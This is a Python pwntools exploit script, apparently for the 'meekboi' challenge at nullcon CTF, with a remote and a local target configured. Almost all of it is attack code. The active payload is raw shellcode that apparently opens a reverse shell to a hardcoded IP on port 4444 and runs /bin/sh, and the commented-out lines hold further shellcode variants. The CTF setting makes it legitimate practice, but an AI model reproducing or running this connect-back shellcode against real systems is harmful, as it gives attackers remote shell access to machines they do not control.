#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./meekboi"

stdout = 0x6010a0
fclose = 0x601020

rhp1 = {"host":"pwn1.ctf.nullcon.net","port":5002}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

def exploit(conn):
  sleep(1)

  #shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
  #shellcode = "\x48\xC7\xC3\x68\x10\x60\x00\x48\xC7\x03\x50\x10\x60\x00"
  #shellcode = "\x48\xC7\xC3\x20\x10\x60\x00\x48\xC7\x03\x50\x10\x60\x00\x48\xC7\xC3\x68\x10\x60\x00\x48\xC7\x03\x20\x0A\x40\x00"

  shellcode = "\x68\x23\xc8\x6b\x16\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"

  #conn.send("A")
  raw_input()
  conn.send(shellcode)

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

